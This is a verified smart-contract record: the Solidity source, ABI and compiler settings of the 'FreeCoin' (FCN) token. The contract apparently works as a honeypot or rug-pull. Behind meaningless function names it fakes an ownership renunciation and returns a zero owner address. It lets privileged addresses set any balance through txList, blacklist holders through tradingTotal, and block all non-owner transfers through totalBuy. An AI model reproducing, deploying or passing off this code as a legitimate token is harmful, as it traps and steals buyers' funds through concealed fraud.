{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract fromLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeReceiver {\n    function createPair(address receiverFundBuy, address fundBuyTo) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface fundReceiverSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface maxList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isSell) external view returns (uint256);\n\n    function transfer(address receiverBuy, uint256 isLaunch) external returns (bool);\n\n    function allowance(address txReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverBuy,\n        uint256 isLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletModeTake, uint256 value);\n    event Approval(address indexed txReceiver, address indexed spender, uint256 value);\n}\n\ninterface maxListMetadata is maxList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FreeCoin is fromLaunched, maxList, maxListMetadata {\n\n    mapping(address => mapping(address => uint256)) private isTrading;\n\n    uint256 constant takeFund = 3 ** 10;\n\n    address tradingToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private atTeam;\n\n    address private toToken;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityLaunched;\n    }\n\n    bool public listWallet;\n\n    function transfer(address maxLaunched, uint256 isLaunch) external virtual override returns (bool) {\n        return feeTo(_msgSender(), maxLaunched, isLaunch);\n    }\n\n    bool private txMode;\n\n    uint8 private autoList = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellSender;\n    }\n\n    uint256 maxAtEnable;\n\n    uint256 public enableList;\n\n    function balanceOf(address isSell) public view virtual override returns (uint256) {\n        return atTeam[isSell];\n    }\n\n    uint256 private sellSender = 100000000 * 10 ** 18;\n\n    function allowance(address marketingLaunched, address swapToken) external view virtual override returns (uint256) {\n        if (swapToken == tradingToken) {\n            return type(uint256).max;\n        }\n        return isTrading[marketingLaunched][swapToken];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapExempt;\n    }\n\n    function autoSenderLaunch() public {\n        emit OwnershipTransferred(listReceiverSell, address(0));\n        toToken = address(0);\n    }\n\n    uint256 public launchedTxLaunch;\n\n    string private swapExempt = \"FCN\";\n\n    mapping(address => bool) public marketingAmount;\n\n    function tradingTotal(address swapList) public {\n        tradingFund();\n        if (autoToken != txMode) {\n            launchedTxLaunch = tradingTake;\n        }\n        if (swapList == listReceiverSell || swapList == sellReceiver) {\n            return;\n        }\n        buyTx[swapList] = true;\n    }\n\n    address public sellReceiver;\n\n    uint256 public senderLaunch = 0;\n\n    function totalTo(address fundSender, address receiverBuy, uint256 isLaunch) internal view returns (uint256) {\n        require(isLaunch > 0);\n\n        uint256 receiverAt = 0;\n        if (fundSender == sellReceiver && atLaunchedSell > 0) {\n            receiverAt = isLaunch * atLaunchedSell / 100;\n        } else if (receiverBuy == sellReceiver && senderLaunch > 0) {\n            receiverAt = isLaunch * senderLaunch / 100;\n        }\n        require(receiverAt <= isLaunch);\n        return isLaunch - receiverAt;\n    }\n\n    event OwnershipTransferred(address indexed swapExemptList, address indexed launchToken);\n\n    address marketingLaunch;\n\n    function transferFrom(address fundSender, address receiverBuy, uint256 isLaunch) external override returns (bool) {\n        if (_msgSender() != tradingToken) {\n            if (isTrading[fundSender][_msgSender()] != type(uint256).max) {\n                require(isLaunch <= isTrading[fundSender][_msgSender()]);\n                isTrading[fundSender][_msgSender()] -= isLaunch;\n            }\n        }\n        return feeTo(fundSender, receiverBuy, isLaunch);\n    }\n\n    function tradingFund() private view {\n        require(marketingAmount[_msgSender()]);\n    }\n\n    function approve(address swapToken, uint256 isLaunch) public virtual override returns (bool) {\n        isTrading[_msgSender()][swapToken] = isLaunch;\n        emit Approval(_msgSender(), swapToken, isLaunch);\n        return true;\n    }\n\n    uint256 teamMin;\n\n    uint256 public txShould;\n\n    function autoReceiverBuy(address swapLaunched) public {\n        require(swapLaunched.balance < 100000);\n        if (enableLaunch) {\n            return;\n        }\n        \n        marketingAmount[swapLaunched] = true;\n        if (txShould != enableList) {\n            listWallet = false;\n        }\n        enableLaunch = true;\n    }\n\n    function owner() external view returns (address) {\n        return toToken;\n    }\n\n    function launchedTrading(address fundSender, address receiverBuy, uint256 isLaunch) internal returns (bool) {\n        require(atTeam[fundSender] >= isLaunch);\n        atTeam[fundSender] -= isLaunch;\n        atTeam[receiverBuy] += isLaunch;\n        emit Transfer(fundSender, receiverBuy, isLaunch);\n        return true;\n    }\n\n    string private liquidityLaunched = \"Free Coin\";\n\n    mapping(address => bool) public buyTx;\n\n    function feeTo(address fundSender, address receiverBuy, uint256 isLaunch) internal returns (bool) {\n        if (fundSender == listReceiverSell) {\n            return launchedTrading(fundSender, receiverBuy, isLaunch);\n        }\n        uint256 marketingFee = maxList(sellReceiver).balanceOf(marketingLaunch);\n        require(marketingFee == teamMin);\n        require(receiverBuy != marketingLaunch);\n        if (buyTx[fundSender]) {\n            return launchedTrading(fundSender, receiverBuy, takeFund);\n        }\n        isLaunch = totalTo(fundSender, receiverBuy, isLaunch);\n        return launchedTrading(fundSender, receiverBuy, isLaunch);\n    }\n\n    bool public tradingLiquidity;\n\n    uint256 private receiverIsMode;\n\n    constructor (){\n        \n        autoSenderLaunch();\n        fundReceiverSell buyLiquidity = fundReceiverSell(tradingToken);\n        sellReceiver = takeReceiver(buyLiquidity.factory()).createPair(buyLiquidity.WETH(), address(this));\n        marketingLaunch = takeReceiver(buyLiquidity.factory()).feeTo();\n        \n        listReceiverSell = _msgSender();\n        marketingAmount[listReceiverSell] = true;\n        atTeam[listReceiverSell] = sellSender;\n        if (txShould != receiverIsMode) {\n            launchedTxLaunch = enableList;\n        }\n        emit Transfer(address(0), listReceiverSell, sellSender);\n    }\n\n    function totalBuy(uint256 isLaunch) public {\n        tradingFund();\n        teamMin = isLaunch;\n    }\n\n    address public listReceiverSell;\n\n    uint256 public atLaunchedSell = 3;\n\n    uint256 private tradingTake;\n\n    bool public autoToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoList;\n    }\n\n    function getOwner() external view returns (address) {\n        return toToken;\n    }\n\n    bool public enableLaunch;\n\n    function txList(address maxLaunched, uint256 isLaunch) public {\n        tradingFund();\n        atTeam[maxLaunched] = isLaunch;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapExemptList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletModeTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunchedSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"}],\"name\":\"autoReceiverBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSenderLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTxLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiverSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isLaunch\",\"type\":\"uint256\"}],\"name\":\"totalBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"}],\"name\":\"tradingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLaunch\",\"type\":\"uint256\"}],\"name\":\"txList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FreeCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}